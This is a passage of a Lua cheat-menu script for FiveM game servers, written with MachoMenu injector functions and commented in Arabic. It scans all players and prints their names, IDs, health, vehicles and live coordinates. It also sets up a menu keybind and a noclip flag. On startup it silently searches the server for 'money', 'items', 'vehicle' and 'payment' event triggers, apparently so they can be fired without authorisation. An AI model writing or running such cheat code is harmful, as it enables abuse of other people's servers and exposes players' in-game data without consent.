                local health = GetEntityHealth(playerPed)
                local maxHealth = GetEntityMaxHealth(playerPed)
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                local vehicleName = "On Foot"
                
                if vehicle ~= 0 then
                    local vehicleModel = GetEntityModel(vehicle)
                    vehicleName = GetDisplayNameFromVehicleModel(vehicleModel)
                end
                
                table.insert(playersList, {
                    id = i,
                    serverId = serverId,
                    name = playerName,
                    coords = playerCoords,
                    health = health,
                    maxHealth = maxHealth,
                    vehicle = vehicleName,
                    isMe = isMe
                })
                
                onlineCount = onlineCount + 1
            end
        end
        
        -- ترتيب اللاعبين حسب Server ID
        table.sort(playersList, function(a, b)
            return a.serverId < b.serverId
        end)
        
        -- طباعة النتائج في F8
        print("^3========================================")
        print("^2         PLAYERS SCAN RESULTS         ")
        print("^3========================================")
        print("^6Total Online Players: ^5" .. onlineCount)
        print("^3========================================")
        print("")
        
        for _, player in ipairs(playersList) do
            local nameColor = "^7" -- أبيض عادي
            local statusText = ""
            
            if player.isMe then
                nameColor = "^2" -- أخضر للاعب الحالي
                statusText = " ^3[YOU]"
            end
            
            -- حالة الصحة
            local healthPercent = math.floor((player.health / player.maxHealth) * 100)
            local healthColor = "^2" -- أخضر
            if healthPercent < 50 then
                healthColor = "^3" -- برتقالي
            end
            if healthPercent < 25 then
                healthColor = "^1" -- أحمر
            end
            
            -- طباعة معلومات اللاعب
            print("^6Player ID: ^5" .. player.id .. " ^6| Server ID: ^5" .. player.serverId)
            print("^6Name: " .. nameColor .. player.name .. statusText)
            print("^6Health: " .. healthColor .. player.health .. "^7/" .. player.maxHealth .. " ^7(" .. healthPercent .. "%)")
            print("^6Vehicle: ^7" .. player.vehicle)
            print("^6Position: ^7X: " .. string.format("%.1f", player.coords.x) .. 
                  " ^7Y: " .. string.format("%.1f", player.coords.y) .. 
                  " ^7Z: " .. string.format("%.1f", player.coords.z))
            print("^3----------------------------------------")
        end
        
        print("")
        print("^3========================================")
        print("^2           SCAN COMPLETED              ")
        print("^3========================================")
        
        -- إحصائيات إضافية
        local playersInVehicles = 0
        local playersOnFoot = 0
        
        for _, player in ipairs(playersList) do
            if player.vehicle == "On Foot" then
                playersOnFoot = playersOnFoot + 1
            else
                playersInVehicles = playersInVehicles + 1
            end
        end
        
        print("^6Statistics:")
        print("^7- Players on foot: ^5" .. playersOnFoot)
        print("^7- Players in vehicles: ^5" .. playersInVehicles)
        print("^3========================================")
        
        -- إنشاء قائمة مبسطة للنسخ
        print("")
        print("^2Quick Copy List:")
        print("^3----------------")
        for _, player in ipairs(playersList) do
            local meTag = player.isMe and " [YOU]" or ""
            print("^5" .. player.serverId .. " ^7- " .. player.name .. meTag)
        end
        print("^3----------------")
        
        MachoMenuNotification("Scanner", "Scan complete! Check F8 console for results.")
    end)
end)
local selectedKey = 0x14 -- الزر الافتراضي هو 0x14 (Caps Lock)
local nocliptx = false  -- تصحيح الغلط: flase → false

-- إعداد واجهة اختيار الزر
MachoMenuKeybind(toolstabmain, "Menu Key", 0x14, function(key, toggle)
    selectedKey = key    -- تحديث الزر المختار
    MachoMenuSetKeybind(MenuWindow, selectedKey) -- تطبيق الزر المختار
end)

-- تعيين الزر الافتراضي عند تحميل القائمة
MachoMenuSetKeybind(MenuWindow, selectedKey)

local settingtab = MachoMenuAddTab(MenuWindow, "settings")
local settingbmain = MachoMenuGroup(settingtab, "Main", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + LeftSectionWidth, MenuSize.y - 5)
local settingigger = MachoMenuGroup(settingtab, "triggers", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, 5 + MachoPaneGap + RightSectionHeight)
local settingidk = MachoMenuGroup(settingtab, "idk waiting", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap + RightSectionHeight + 5, 
        MenuSize.x - 5, MenuSize.y - 5)

end



-- Main initialization
Citizen.CreateThread(function()
    Citizen.Wait(2000)
    MachoMenuNotification("7OO4", "Auto-searching for triggers...")
    local foundAny = comprehensiveSearch()
    if foundAny then
        local totalTriggers = #foundTriggers.items + #foundTriggers.money + #foundTriggers.vehicle + #foundTriggers.payment
        MachoMenuNotification("Success", "Found " .. totalTriggers .. " triggers")
    else
        MachoMenuNotification("Notice", "No triggers found - menu available")
    end
    Citizen.Wait(500)
    createMenu()
    MachoMenuNotification("7OO4 3MK Ready", "Dynamic menu ready - Search completed")
    
    -- Start background silent search
    backgroundSilentSearch()
end)